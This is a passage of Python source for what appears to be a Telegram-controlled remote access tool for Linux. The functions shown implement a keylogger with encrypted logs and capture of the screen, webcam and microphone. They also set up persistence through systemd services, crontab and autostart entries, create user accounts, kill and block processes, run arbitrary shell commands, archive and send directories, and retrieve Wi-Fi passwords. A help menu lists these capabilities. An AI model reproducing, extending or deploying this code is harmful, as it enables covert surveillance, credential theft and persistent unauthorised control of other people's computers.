\tUSAGE: {cpu_usage}%
''')
        
        buf.write('\nGPU:\n')
        videocard = []
        lspci = shell('lspci', output=True)

        if lspci is not None:
            exp_vmem = re_exp(r'size=(\w+)')
            exp_virq = re_exp(r'IRQ\s(\d+)')

            for line in lspci.splitlines():
                if 'VGA' not in line:
                    continue

                lspci_nn = shell(f'lspci -vv -s {line.split(maxsplit=1)[0]}', output=True)

                if lspci_nn is None:
                    continue

                vd = {
                    'name': None,
                    'mem': [],
                    'irq': NULL,
                    'driver': NULL,
                    'module': NULL
                }

                for lline in lspci_nn.splitlines():
                    try:
                        k, v = lline.split(':', 1)
                        k, v = k.strip().lower(), v.strip()
                    except:
                        continue

                    if k.startswith('subsystem'):
                        vd['name'] = v
                    elif k.startswith('region'):
                        vmem = exp_vmem.search(v)
                        vd['mem'].append(f'{k}: {vmem.group(1)}' if vmem else NULL)
                    elif k.startswith('interrupt'):
                        virq = exp_virq.search(v)
                        vd['irq'] = virq.group(1) if virq else NULL
                    elif k.startswith('kernel driver'):
                        vd['driver'] = v
                    elif k.startswith('kernel modules'):
                        vd['module'] = v
                
                if vd['name'] is not None:
                    videocard.append(vd)
            
            if videocard:
                for n in videocard:
                    buf.write(f'\tNAME: {n["name"]}\n\tMEMORY: {n["mem"]}\n\tIRQ: {n["irq"]}\n\tDRIVER: {n["driver"]}\n\tMODULE: {n["module"]}\n\n')

        buf.write(('' if videocard else '\n') + 'RAM:\n')
        pmemory = psutil.virtual_memory()

        if pmemory:
            buf.write(f'''\tTOTAL: {NULL if pmemory.total is None else pmemory.total >> 30} GB
\tUSED: {NULL if pmemory.used is None else pmemory.used >> 30} GB
\tFREE: {NULL if pmemory.free is None else pmemory.free >> 30} GB
\tUSAGE: {NULL if pmemory.percent is None else int(pmemory.percent)}%
''')
        
        buf.write('\nSWAP:\n')
        pswap = psutil.swap_memory()
        
        if pswap:
            buf.write(f'''\tTOTAL: {NULL if pswap.total is None else pswap.total >> 30} GB
\tUSED: {NULL if pswap.used is None else pswap.used >> 30} GB
\tFREE: {NULL if pswap.free is None else pswap.free >> 30} GB
\tUSAGE: {int(pswap.percent)}%
''')

        buf.write('\nDISK:\n')
        pdisk = psutil.disk_partitions()

        if pdisk:
            for n in pdisk:
                pdisk_usage = psutil.disk_usage(n.mountpoint)

                buf.write(f'''\tNAME: {NULL if n.device is None else n.device}
\tMOUNT OPTION: {NULL if n.opts is None else n.opts}
\tFILE SYSTEM: {NULL if n.fstype is None else n.fstype}
\tTOTAL: {NULL if pdisk_usage.total is None else pdisk_usage.total >> 30} GB
\tUSED: {NULL if pdisk_usage.used is None else pdisk_usage.used >> 30} GB
\tFREE: {NULL if pdisk_usage.free is None else pdisk_usage.free >> 30} GB
\tUSAGE: {NULL if pdisk_usage.percent is None else int(pdisk_usage.percent)}%\n
''')
        
        return buf.getvalue()


def modprobe(mode, name=None):
    match mode:
        case 'get':
            modprobe_module = []

            lsmod = shell('lsmod', output=True)

            if lsmod is None:
                return modprobe_module
            
            for line in lsmod.splitlines():
                n = line.split()
                n_len = len(n)

                if (n_len < 3) or not n[1].isdigit():
                    continue

                modprobe_module.append([
                    n[0],
                    f'{n[1]} bytes',
                    n[2],
                    n[3] if n_len > 3 else NULL
                ])

            return modprobe_module
        case 'installed':
            return shell(f'modprobe "{name}"')
        case 'deleted':
            return shell(f'modprobe -r "{name}"')
        

def systemctl(mode, name=None, description=None, path=None, args='none', root=True, _reload=True):
    if not os.path.isdir(PATH_SYSTEMCTL):
        raise RuntimeError('systemctl is not working')


    def exist():
        try:
            return bool(shell(f'systemctl status "{name}"', output=True).strip())
        except:
            return False


    match mode:
        case 'get':
            with StringIO() as buf:
                try:
                    list_units = json(shell('systemctl list-units --type=service --all --output=json', output=True))
                except:
                    return ''
            
                for n in list_units:
                    buf.write(f'''NAME: {n.get("unit", NULL)}
DESCRIPTION: {n.get("description", NULL)}
LOAD: {n.get("load", NULL).upper()}
SUB: {n.get("sub", NULL).upper()}
STATUS: {n.get("active", NULL).upper()}\n
''')

                return buf.getvalue()
        case 'query':
            if not exist():
                return ''

            service_status = shell(f'systemctl status "{name}"', output=True)
            service_show = shell(f'systemctl show "{name}"', output=True)

            return f'{service_status}\n\n{service_show}'
        case 'update':
            return shell('systemctl daemon-reload')
        case 'create':
            if os.path.exists(path):
                path = os.path.abspath(path)

            with open(os.path.join(PATH_SYSTEMCTL, f'{name}.service'), 'w') as f:
                f.write(f'''[Unit]
Description={description}

[Service]
Type=simple
ExecStart="{path}" {"" if args == "none" else args}
User={"root" if root else LOGGED_USER}
Restart=always

[Install]
WantedBy=multi-user.target
''')
            shell(f'systemctl enable "{name}"')

            if _reload:
                shell('systemctl daemon-reload')
            
            return f'service is created ({name}) [+]'
        case 'delete':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            shell(f'systemctl disable "{name}"')
            shell(f'systemctl stop "{name}"')

            for n in [
                f'/etc/systemd/system/{name}.service',   
                f'/lib/systemd/system/{name}.service',   
                f'/usr/lib/systemd/system/{name}.service',  
                f'/home/{LOGGED_USER}/.config/systemd/user/{name}.service'
            ]:
                if os.path.isfile(n):
                    os.remove(n)
            
            shell('systemctl daemon-reload')
                
            return f'service is deleted ({name}) [+]'
        case 'enable':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is enabled ({name}) [+]' if shell(f'systemctl enable "{name}"') else f'failed to enable service ({name}) [-]'
        case 'disable':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is disabled ({name}) [+]' if shell(f'systemctl disable "{name}"') else f'failed to disable service ({name}) [-]'
        case 'start':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is started ({name}) [+]' if shell(f'systemctl start "{name}"') else f'failed to start service ({name}) [-]'
        case 'restart':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is restarted ({name}) [+]' if shell(f'systemctl restart "{name}"') else f'failed to restart service ({name}) [-]'
        case 'stop':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is stopped ({name}) [+]' if shell(f'systemctl stop "{name}"') else f'failed to stop service ({name}) [-]'


def crontab(mode, name=None, event=None, root=True, path=None, args='none'):
    if not os.path.isfile(PATH_CRONTAB):
        raise RuntimeError('crontab is not working')
    
    match mode:
        case 'get':
            tasks = []

            for line in read_file(PATH_CRONTAB).splitlines():
                n = line.split('#=')
                
                if len(n) != 2:
                    continue

                tasks.append([n[1].strip(), n[0].strip()])
            
            return tasks
        case 'create':
            if os.path.exists(path):
                path = os.path.abspath(path)

            task = f'{event} {"root" if root else LOGGED_USER} "{path}" {"" if args == "none" else args} #={name}'
            
            return f'task is created ({name}) in crontab [+]' if change_file(PATH_CRONTAB, f'#={name}', task) else f'failed to create task ({name}) in crontab [-]'
        case 'delete':
            task = f'#={name}'

            return f'task is deleted ({name}) in crontab [+]' if change_file(PATH_CRONTAB, task, task, delete=True) else f'failed to delete task ({name}) in crontab [-]'
            

def startup(mode, name=None, path=None, args='none'):
    if not os.path.isdir(PATH_CONFIG_STARTUP):
        shell(f'sudo -u "{LOGGED_USER}" mkdir -p "{PATH_CONFIG_STARTUP}"')

    if not os.path.isdir(PATH_CONFIG_STARTUP):
        raise RuntimeError(f'startup is not working')  

    match mode:
        case 'get':
            with StringIO() as buf:
                for n in os.listdir(PATH_CONFIG_STARTUP):
                    if not n.endswith('.desktop'):
                        continue

                    buf.write(f'NAME: {n.removesuffix(".desktop")}\n\n')
                
                return buf.getvalue()
        case 'create':
            path_name = os.path.join(PATH_CONFIG_STARTUP, f'{name}.desktop')

            if os.path.isfile(path):
                path = os.path.abspath(path)

            with open(path_name, 'w') as f:
                f.write(f'''[Desktop Entry]
Type=Application
Exec="{path}" {"" if args == "none" else args}
Name={name}
''')    
            os.chmod(path_name, 0o755)
            
            return f'created ({name}) in startup [+]'
        case 'delete':
            path_name = os.path.join(PATH_CONFIG_STARTUP, f'{name}.desktop')

            if os.path.isfile(path_name):
                os.remove(path_name)
                return f'deleted ({name}) in startup [+]'
            else:
                return f'file does not exist ({name}) in startup [*]'
        case 'start':
            path_name = os.path.join(PATH_CONFIG_STARTUP, f'{name}.desktop')

            if not os.path.isfile(path_name):
                return f'file does not exist ({name}) in startup [*]'

            return f'started ({name}) in startup [+]' if shell(f'xdg-open "{path_name}"') else f'failed to start ({name}) in startup [-]'


def env(mode, ekey=None, evalue=None):
    if not os.path.isfile(PATH_ENVIRONMENT):
        raise RuntimeError(f'environment is not working')  
    
    match mode:
        case 'get' | 'query':
            with StringIO() as buf:
                for line in read_file(PATH_ENVIRONMENT).splitlines():
                    line = line.strip()

                    if not line or line.startswith('#'):
                        continue

                    n = line.split('=', 1)

                    if len(n) != 2:
                        continue

                    name, value = n

                    comment_index = value.rfind('#')

                    if comment_index != -1:
                        value = value[:comment_index].strip()

                    if mode == 'query':
                        if ekey == name:
                            return f'{name}={value}\n\n'
                    else: 
                        buf.write(f'{name}={value}\n\n')

                return buf.getvalue()
        case 'create':
            return f'environment key is created ({ekey}={evalue}) [+]' if change_file(PATH_ENVIRONMENT, ekey, f'{ekey}={evalue}') else f'failed to create environment key ({ekey}) [-]'
        case 'delete':
            return f'environment key is deleted ({ekey}) [+]' if change_file(PATH_ENVIRONMENT, ekey, ekey, delete=True) else f'environment key does not exist ({ekey}) [*]'


def user(mode, name=None, password='none'):
    match mode:
        case 'get':
            with StringIO() as buf:
                ruser = get_user(name)

                if not ruser:
                    return ''
                
                for n in ruser:
                    buf.write(f'NAME: {n[0]}\nUID: {n[1]}\nGID: {n[2]}\nDIR: {n[3]}\nSHELL: {n[4]}\n\n')
                    
                return buf.getvalue()
        case 'create':
            useradd = shell(f'useradd "{name}"')

            if password != 'none':
                try:
                    sp_run(f'passwd "{name}"', input=f'{password}\n{password}', text=True, stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except:
                    return f'failed to set user ({name}) password ({password}) [*]'
                
            return f'user is created ({name}) [+]' if useradd else f'failed to create user ({name}) [-]'
        case 'delete':
            return f'user is deleted ({name}) [+]' if shell(f'userdel "{name}"') else f'failed to delete user ({name}) [-]'


def app_blocker():
    while True:
        sleep(1)

        if not os.path.isfile(FILE_APP_BLOCKER):
            continue
        
        try:
            blocked_app = read_file(FILE_APP_BLOCKER)

            if not blocked_app:
                continue

            for line in decrypt(blocked_app).splitlines():
                n = line.split('=')

                if len(n) == 2:
                    kill(n[0])
        except:
            continue


def ps():
    process = []

    for n in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info', 'create_time', 'status']):
        proc_pid = n.info.get('pid', NULL)
        proc_cpu =  n.info.get('cpu_percent', NULL)
        proc_mem = n.info.get('memory_info', NULL)
        proc_time = n.info.get('create_time', NULL)

        if (proc_cpu != NULL) and (proc_cpu is not None):
            proc_cpu = f'{int(proc_cpu)}%'

        if (proc_mem != NULL) and (proc_mem.rss is not None):
            proc_mem = f'{proc_mem.rss >> 10} KB'

        if (proc_time != NULL) and (proc_time is not None):
            proc_time = str(timedelta(seconds=int(time() - proc_time)))

        process.append([
            proc_pid,
            n.info.get('name', NULL),
            n.info.get('username', NULL),
            proc_cpu,
            proc_mem,
            proc_time,
            n.info.get('status', NULL).upper()
        ])

    return process


def kill(proc):
    killed = False

    if proc.isdigit():
        try:
            psutil.Process(int(proc)).kill()
        except: ...
        else:
            killed = True
    else:
        if shell(f'pkill -9 "{proc}"'):
            killed = True
     
    return killed


def launch(path, args):
    if not os.path.exists(path):
        path = os.path.join(PATH_SHARE, path)

        if not os.path.exists(path):
            return None
        
    try:
        Popen([os.path.abspath(path) if os.path.isfile(path) and os.access(path, os.X_OK) else 'xdg-open'] + split_args(args), stdout=DEVNULL, stderr=DEVNULL) 
    except:
        return False
    else:
        return True


def screenshot():
    try:
        with mss() as screen:
            screen.shot(output=FILE_SCREENSHOT)
                
        screenshot_bytes = read_file(FILE_SCREENSHOT, b=True)

        if os.path.isfile(FILE_SCREENSHOT):
            os.remove(FILE_SCREENSHOT)
        
        return screenshot_bytes
    except: 
        return None


def webcam_screenshot():
    try:
        (
            ffmpeg
            .input(
                '/dev/video0',
                format='v4l2',
                framerate=30,
                video_size='640x480'   
            )
            .output(
                FILE_WEBCAM_SCREENSHOT,
                vframes=1,
                format='image2',       
                vcodec='png'          
            )
            .overwrite_output()
            .run(quiet=True)
        )

        webcam_screenshot_bytes = read_file(FILE_WEBCAM_SCREENSHOT, b=True)

        if os.path.isfile(FILE_WEBCAM_SCREENSHOT):
            os.remove(FILE_WEBCAM_SCREENSHOT)

        return webcam_screenshot_bytes
    except:
        return None


def get_audio_alsa(output=False):
    dtype = 'output' if output else 'input'

    alsa_default = ['default', 'pulse']
    
    pactl = shell('pactl list sources short', output=True)

    if pactl is not None:
        for line in pactl.splitlines():
            n = line.split()

            if len(n) < 3:
                continue

            name = n[1].strip()

            if dtype in name:
                return [name, 'pulse']
        
    pw_cli = shell('pw-cli ls Node', output=True)

    if pw_cli is None:
        return alsa_default

    for line in pw_cli.splitlines():
        n = line.split()

        if (len(n) != 3) or (n[0] != 'node.name'):
            continue

        name = n[-1].replace('"', '').strip()

        if dtype in name:
            return [name, 'pipewire']

    return alsa_default
    

def audio(mode, second):
    alsa_device, dtype = get_audio_alsa(mode == 'system')

    try:
        (
            ffmpeg
            .input(alsa_device, format=dtype, t=second)  
            .output(FILE_AUDIO, acodec='libmp3lame')
            .overwrite_output()
            .run(quiet=True)
        )

        audio_bytes = read_file(FILE_AUDIO, b=True)

        if os.path.isfile(FILE_AUDIO):
            os.remove(FILE_AUDIO)

        return audio_bytes
    except:
        return None


def keylogger():
    buffer = StringIO()
    buffer_size = 0
    
    while True:
        sleep(1)

        if not os.path.isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
            continue
        
        while True:
            if buffer_size == KEYLOGGER_BUFFER_SIZE:
                with open(FILE_KEYLOGGER, 'a', encoding=FILE_ENCODING) as f:
                    f.write(encrypt(buffer.getvalue()) + '\n') 
                    
                buffer = StringIO()
                buffer_size = 0

                if not os.path.isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
                    break
    
            try:
                kevent = kb.read_event()
            except:
                continue
            
            if kevent.event_type != 'down':
                continue
            
            buffer.write(f'{kevent.name}\u200F')
            buffer_size += 1


def keylogger_parser(mode):


    def is_char(c):
        return not (c.startswith('[') and c.endswith(']'))
     

    def insert_key(k):
        nonlocal buffer, ptr

        buffer.insert(ptr, k)
        ptr += 1
    

    data = BytesIO()

    if not os.path.isfile(FILE_KEYLOGGER):
        return data

    with open(FILE_KEYLOGGER, 'r', encoding=FILE_ENCODING) as f:
        for i in f:
            try:
                keylogger_data = decrypt(i).split('\u200F')
            except:
                break

            buffer = []
            ptr = 0

            for n in keylogger_data: 
                hotkey = KEYBOARD_HOTKEY.get(n)

                if hotkey is None:
                    insert_key(n)
                    continue

                if mode in {'base', 'char'}:
                    insert_key(KEYBOARD_SPECIAL.get(hotkey, '' if mode == 'char' else hotkey))
                    continue

                match hotkey:
                    case '[BACKSPACE]':
                        if ptr > 0:
                            prev = buffer[ptr - 1]

                            if is_char(prev):
                                ptr -= 1
                                buffer.pop(ptr)
                    case '[DELETE]':
                        if ptr < len(buffer):
                            nextk = buffer[ptr]

                            if is_char(nextk):
                                buffer.pop(ptr)
                    case '[LEFT]':
                        if ptr == 0:
                            continue

                        prev = buffer[ptr - 1]

                        if prev == '[CTRL]':
                            while (ptr > 0) and (buffer[ptr - 1] == '[CTRL]'):
                                buffer.pop(ptr - 1)
                                ptr -= 1

                            while (ptr > 0) and (buffer[ptr - 1].isspace() or not is_char(buffer[ptr - 1])):
                                ptr -= 1

                            while (ptr > 0) and (not buffer[ptr - 1].isspace() and is_char(buffer[ptr - 1])):
                                ptr -= 1
                        else:
                            ptr -= 1
                    case '[RIGHT]':
                        if ptr >= len(buffer):
                            continue

                        cur = buffer[ptr - 1]

                        if cur == '[CTRL]':
                            while (ptr < len(buffer)) and (buffer[ptr - 1] == '[CTRL]'):
                                buffer.pop(ptr - 1)
                                ptr -= 1

                            while (ptr < len(buffer)) and buffer[ptr].isspace():
                                ptr += 1

                            while (ptr < len(buffer)) and is_char(buffer[ptr]) and not buffer[ptr].isspace():
                                ptr += 1
                        else:
                            ptr += 1
                    case '[CTRL]':
                        insert_key('[CTRL]')                       
                    case _:
                        insert_key(KEYBOARD_SPECIAL.get(hotkey, hotkey if mode == 'hotkey' else ''))

                ptr = max(0, min(ptr, len(buffer)))

            buffer = ''.join(buffer)

            if mode == 'no hotkey':
                buffer = buffer.replace('[CTRL]', '')
            
            data.write(buffer.encode())

    return data


def execute(cmd, send):
    cmd_lower = cmd.lower()

    match cmd_lower:
        case 'author': 
            send('''
Hello, welcome to my project!
This project is designed for remote computer access.
This version is a Telegram bot.
My name is Vladislav Khudash.
You can contact me on GitHub: https://github.com/cppandpython
''')
            return
        case 'help':
            send('''Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    repeat                    Repeat command
    session                   About this session
    getpid                    Current pid
    getuid                    Current user
    config                    Bot config control
    account                   Control accounts connected to this computer
    autostart                 Bot autostart   
    restart                   Restart bot    
    exit                      Log out of this session
                 

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Get working directory
    cd                        Change directory         
    ls                        Get information about files or dirs in working directory    
    mkfile                    Create file               
    mkdir                     Create dir              
    rn                        Rename file or dir
    rm                        Delete file 
    rmdir                     Delete dir                          
    cp                        Copy file or dir
    mv                        Move file or dir
    chmod                     Change file or dir mode
    hide                      Hide file or dir 
    unhide                    Unhide file or dir                        
    cat                       Download file
    zip                       Make archive current directory
                 
                 
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    inet                      Enable or disable Internet
    ipconfig                  Get network interfaces     
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    wifi                      Find Wi-Fi or get Wi-Fi password
    site                      Website utilities

                                 
System Commands                                                    
===============

    Command                   Description
    -------                   -----------      
    dmesg                     Get kernel messages                                                                            
    systeminfo                Get information about computer  
    lshw                      Get information about computer using lshw
    modprobe                  Modprobe utilities
    service                   Service utilities 
    crontab                   Crontab utilities 
    startup                   Startup utilities   
    env                       Environment utilities
    user                      User utilities                 
    block                     Block app utilities    
    ps                        Get information about running processes 
    kill                      Terminate process    
    run                       Launch file     
    cmd                       Execute command in shell     
    time                      Get current time or change current time   
    date                      Get current date or change current date   
    sleep                     Sleep computer
    reboot                    Reboot computer         
    shutdown                  Shutdown computer       

                 
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    mouse                     Mouse utilities         
    keyboard                  Keyboard utilities                                                                                                                                       
    clipboard                 Clipboard utilities                    
    screen                    Take screenshot of screen 
    webcam                    Take screenshot of webcam
    audio                     Record audio or play audio 
    msg                       Display message                     
    keylogger                 Keylogger utilities   
''', doc='help.txt')
            return
        case 'repeat':
            send('repeat (command) -c (amount) -d (second)  —  Repeat command')
            return
        case 'getpid':
            send(str(PID))
            return
        case 'getuid':
            send(NODE + '\\\\' + USER)
            return
        case 'config':
            send('''
config -g  —  Get current bot config\n
config (TOKEN|PASSWORD|SEED) -s (value)  —  Set config option\n
config -r (TOKEN|PASSWORD|SEED)  —  Reset config option
''')
            return
        case 'account':
            send('account -g  —  Get accounts connected to session\n\naccount -d (id)  —  Delete account connected to session')
            return
        case 'autostart':
            send('''
autostart -l  —  Get information about bot autostart\n
autostart -c (name) -p (path) -a (none|args)  —  Create file in bot autostart\n
autostart -d (name)  —  Delete file in bot autostart\n
autostart -r  —  Reset bot autostart
''')
            return
        case 'restart':
            if os.path.isfile(__file__):
                send('bot is restarted [+]')
                os.execv(FILE_PYTHON, [FILE_PYTHON, __file__])
            else:
                send('failed to restart bot [-]')

            return
        case 'pwd':
            send(os.getcwd())
            return
        case 'cd':
            send('cd (path)  —  Change directory')
            return
        case 'ls':
            ls_list = ls()

            send(f'DIRECTORY: {os.getcwd()}\n\n' + tabulate(ls_list, headers=[('NAME'), ('MODE'), ('TYPE'), ('HIDDEN'), ('OWNER'), ('SIZE'), ('TIME')], tablefmt='grid'), doc='ls.txt') if ls_list else send(NULL)
            return
        case 'mkfile':
            send('mkfile (path) -d (data)  —  Create file')
            return
        case 'mkdir':
            send('mkdir (path)  —  Create dir')
            return
        case 'rn':
            send('rn (name) -n (new_name)  —  Rename file or dir')
            return
        case 'rm':
            send('rm (path)  —  Delete file')
            return
        case 'rmdir':
            send('rmdir (path)  —  Delete dir')
            return
        case 'cp':
            send('cp (from_path) -t (to_path)  —  Copy file or dir')
            return
        case 'mv':
            send('mv (from_path) -t (to_path)  —  Move file or dir')
            return
        case 'chmod':
            send('chmod (path) -m (number)  —  Change file or dir mode')
            return
        case 'hide':
            send('hide (path)  —  Hide file or dir')
            return
        case 'unhide':
            send('unhide (path)  —  Unhide file or dir')
            return
        case 'cat':
            send('cat (path)  —  Download file')
            return
        case 'zip':
            current_dir = os.path.split(os.getcwd())[-1]
            zip_path = os.path.join(PATH_TMP, current_dir)

            try:
                shutil.make_archive(zip_path, 'zip', '.')
            except:
                send('failed to make archive [-]') 
                return

            if os.path.isfile(f'{zip_path}.zip'):
                try:
                    send(read_file(f'{zip_path}.zip', b=True), doc=f'{current_dir}.zip')
                except:
                    send('archive size is huge [*]')

                os.remove(f'{zip_path}.zip')

            return
        case 'inet':
            send('inet -e  —  Enable Internet\n\ninet -d  —  Disable Internet')
            return
        case 'ipconfig':
            with StringIO() as buf:
                ipconfig_dict = ipconfig()

                ipconfig_global, ipconfig_local = ipconfig_dict['global'], ipconfig_dict['local']

                if ipconfig_global is not None:
                    buf.write(f'''GLOBAL:
\tIP: {ipconfig_global["ip"]}
\tISP: {ipconfig_global["isp"]}
\tCOUNTRY: {ipconfig_global["country"]}
\tREGION: {ipconfig_global["region"]}
\tCITY: {ipconfig_global["city"]}
\tPOSTAL: {ipconfig_global["postal"]}
\tTIMEZONE: {ipconfig_global["timezone"]}
\tLOCATION: {ipconfig_global["location"]}
''')
            
                if ipconfig_local is not None:
                    buf.write('\nLOCAL:\n')

                    for n in ipconfig_local:
                        buf.write(f'\tADAPTER: {n["name"]}\n\tMAC: {n["mac"]}\n\tIPV4: {n["ipv4"]}\n\tIPV6: {n["ipv6"]}\n\n')

                data = buf.getvalue()

            send(data, doc='ipconfig.txt') if data else send(NULL)
            return
        case 'route':
            with StringIO() as buf:
                route_dict = route()

                if route_dict['ipv4'] is not None:
                    buf.write(tabulate(route_dict['ipv4'], headers=[('INTERFACE'), ('IPV4-DST'), ('GATEWAY'), ('SRC'), ('PROTOCOL'), ('SCOPE'), ('METRIC')], tablefmt='grid'))
                
                if route_dict['ipv6'] is not None:
                    if buf.tell():
                        buf.write('\n\n\n')
    
                    buf.write(tabulate(route_dict['ipv6'], headers=[('INTERFACE'), ('IPV6-DST'), ('PREFERENCE'), ('PROTOCOL'), ('METRIC')], tablefmt='grid'))
                
                data = buf.getvalue()

            send(data, doc='route.txt') if data else send(NULL)
            return 
        case 'arp':
            arp_list = arp()

            send(tabulate(arp_list, headers=[('IP'), ('MAC'), ('INTERFACE'), ('STATUS')], tablefmt='grid'), doc='arp.txt') if arp_list else send(NULL)
            return
        case 'netstat':
            netstat_list = netstat()

            send(tabulate(netstat_list, headers=[('PID'), ('PROTOCOL'), ('LOCAL'), ('FOREIGN'), ('STATUS')], tablefmt='grid'), doc='netstat.txt') if netstat_list else send(NULL)
            return
        case 'wifi':
            send('wifi -g  —  Find Wi-Fi\n\nwifi -p  —  Get Wi-Fi password')
            return
        case 'site':
            send('''
site -p (url)  —  Open website\n
site -d (url) -n (name)  —  Download file from website\n
site -l  —  Get blocked sites\n
site -b (domain)  —  Block site\n
site -d (domain)  —  Unblock site\n
site -r  —  Unblock all sites
''')
            return
        case 'dmesg':
            dmesg = shell('dmesg -T', output=True)

            send(dmesg, doc='dmesg.txt') if dmesg else send(NULL)
            return
        case 'systeminfo':
            send(systeminfo(), doc='systeminfo.txt')
            return
        case 'lshw':
            lshw = shell('lshw', output=True)

            send(lshw, doc='lshw.txt') if lshw else send(NULL)
            return
        case 'modprobe':
            send('''
modprobe -g  —  Get modules\n
modprobe -i (name)  —  Install module\n
modprobe -d (name)  —  Delete module
''')
            return
        case 'service':
            send('''
service -g  —  Get information about services\n
service -q (name)  —  Get information about service\n
service -u  —  Update services\n
service -c (name) -d (description) -p (path) -a (args) -u (root|user)  —  Create service\n
service -d (name)  —  Delete service\n
service -e (name)  —  Enable service\n
service -i (name)  —  Disable service\n
service -l (name)  —  Start service\n
service -r (name)  —  Restart service\n
service -s (name)  —  Stop service
''')
            return 
        case 'crontab':
            send('''
crontab -g  —  Get tasks from crontab\n            
crontab -c (name) -e (event) -u (root|user) -p (path) -a (none|args)  —  Create task in crontab\n
crontab -d (name)  —  Delete task from crontab
''')
            return
        case 'startup':
            send('''
startup -g  —  Get information about startup\n
startup -c (name) -p (path) -a (none|args)  —  Create file in startup\n
startup -d (name)  —  Delete file in startup\n
startup -l (name)  —  Start file in startup
''')
            return
        case 'env':
            send('''
env -g  —  Get environment\n
env -q (key)  —  Get value of environment key\n
env -c (key) -v (value)  —  Create environment key\n
env -d (key)  —  Delete environment key
''')
            return
        case 'user':
            send('''
user -g  —  Get information about users\n
user -q (name)  —  Get information about user\n
user -c (name) -p (none|password)  —  Create user\n
user -d (name)  —  Delete user
''')
            return
        case 'block':
            send('''
block -l  —  Get blocked apps\n
block -b (name)  —  Block app\n
block -d (name)  —  Unblock app\n
block -r  —  Unblock all apps
''')
            return
        case 'ps':
            with StringIO() as buf:
                ps_list = ps()

                if not ps_list:
                    send(NULL)
                    return

                for n in ps_list:
                    buf.write(f'''PID: {n[0]}
NAME: {n[1]}
USER: {n[2]}
CPU: {n[3]}
MEMORY: {n[4]}
TIME: {n[5]}
STATUS: {n[6]}\n
''')
            
                send(buf.getvalue(), doc='ps.txt')
                return
        case 'kill':
            send('kill (pid|name)  —  Terminate process')
            return
        case 'run':
            send('run (path) -a (none|args)  —  Launch file')
            return
        case 'cmd':
            send('cmd -e (command)  —  Cmd execute command without output\n\ncmd -g (command)  —  Cmd execute command with output')
            return
        case 'time':
            send('time -g  —  Get time\n\ntime -s (time)  —  Set time')
            return
        case 'date':
            send('date -g  —  Get date\n\ndate -s (date)  —  Set date')
            return
        case 'sleep':
            shell('systemctl suspend')
            return
        case 'reboot':
            shell('reboot')
            return
        case 'shutdown':
            shell('poweroff')
            return
        case 'mouse':
            send('''
mouse -p  —  Get current mouse position\n
mouse -x (coordinate) -y (coordinate) -d (delay)  —  Move mouse\n
mouse -l|-r|-m -c (click) -d (delay)  —  Click mouse button\n
mouse -s (amount)  —  Mouse scroll
''')
            return
        case 'keyboard':
            send('''
keyboard -t (text) -d (second)  —  Type on keyboard\n
keyboard -k (key) -p (amount) -d (second)  —  Press key or hotkey on keyboard\n
keyboard -c -k|-h (key) -n (new_key)  —  Remap key or hotkey on keyboard\n
keyboard -b (key)  —  Block key or hotkey on keyboard\n
keyboard -r  —  Reset keyboard settings
''')
            return
        case 'clipboard':
            send('''
clipboard -g  —  Get data from clipboard\n
clipboard -c (data)  —  Copy data to clipboard\n
clipboard -r  —  Clear clipboard
''')
            return
        case 'screen':
            png = screenshot()

            send('failed to take screenshot [-]') if png is None else send(png, doc='screenshot.png')
            return
        case 'webcam':
            png = webcam_screenshot()

            send('failed to take screenshot from webcam [-]') if png is None else send(png, doc='webcam.png')
            return
        case 'audio':
            send('audio (-m|-p) (second)  —  Record audio\n\naudio -s (path)  —  Play audio')
            return
        case 'msg':
            send('msg (-p|-s) (title) -t (text)  —  Display message')
            return
        case 'keylogger':
            send('''
keylogger -g (base|char|hotkey|no hotkey)  —  Get keylogger data\n
keylogger -e  —  Enable keylogger\n
keylogger -d  —  Disable keylogger\n
keylogger -s  —  Keylogger status\n
keylogger -r  —  Reset keylogger data
''')
            return
        
    cmd_lower = cmd_lower.split(maxsplit=1)

    if len(cmd_lower) != 2:
        send(f'command not found ({cmd})')
        return
    
    args = cmd.split(maxsplit=1)[-1]

    match cmd_lower[0]:
        case 'repeat': 
            if exp := parse_cmd(r'(?P<command>.*?)\s*-c\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                command, amount, delay = exp['command'], int(exp['amount']), int(exp['delay'])

                send(f'started repeating ({command}) -c ({amount}) -s ({delay}) [*]')

                for n in range(1, amount + 1):
                    try:
                        execute(command, send)
                    except BaseException as error:
                        send(f'failed to repeat command {n} ({command}) [-]\n\n{type(error).__name__}({error})')
                    else:
                        send(f'command is repeated {n} ({command}) [+]')

                    sleep(delay)

                send(f'end of repeat command ({command}) -c ({amount}) -s ({delay}) [*]')
                return
        case 'config':
            if args == '-g':
                send(f'''
#-------------------------|NECESSARILY|-------------------------#
TOKEN = {TOKEN}
PASSWORD = {PASSWORD}
SEED = {SEED}
PATH = {PATH}
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = {BOT_FILE_NAME}
BOT_SERVICE_NAME = {BOT_SERVICE_NAME}
BOT_SERVICE_DESCRIPTION = {BOT_SERVICE_DESCRIPTION}
BOT_EXE = {BOT_EXE}
#----------------------------|END|---------------------------#
''')
                return
            elif exp := parse_cmd(r'(?P<const>TOKEN|PASSWORD|SEED)\s*-s\s*(?P<value>.+)', args):
                value = exp['value'] 
            
                match exp['const']:
                    case 'TOKEN':
                        if not http(f'https://api.telegram.org/bot{value}/getMe', json=True).get('ok', False):
                            send('Telegram bot (TOKEN) is invalid')
                            return

                        write_file(CONFIG_TOKEN, encrypt(value))
